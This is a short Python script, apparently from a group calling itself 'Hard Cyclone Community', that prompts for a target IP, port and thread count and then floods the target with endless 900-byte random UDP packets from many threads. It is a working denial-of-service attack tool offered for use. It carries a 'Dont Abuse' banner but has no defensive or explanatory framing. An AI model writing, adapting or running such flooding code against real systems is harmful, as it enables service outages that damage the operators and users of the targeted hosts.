import random
import socket
import threading
import os

os.system("clear")
print(">> Code By Ace <<")
print(">> Hard Cyclone Community <<")
print(">> Dont Abuse <<")
ip = str(input("• Ip Target :"))
port = int(input("• Port Target :"))
t1m3 = int(input("• Connection :"))
threads = int(input("• Threads :"))

def hc():
       data = random._urandom(900)
       while True:
               try:
                    s = socket._socket(socket.AF_INET, socket.SOCK_DGRAM)
                    addr = (str(ip),int(port))
                    for x in range(t1m3):
                            s.sendto(data,addr)
                    print("! Hard Cyclone Attack To Ip !")
               except:
                    print("! WARNING !")

for y in range(threads):
               th = threading.Thread(target = hc)
               th.start()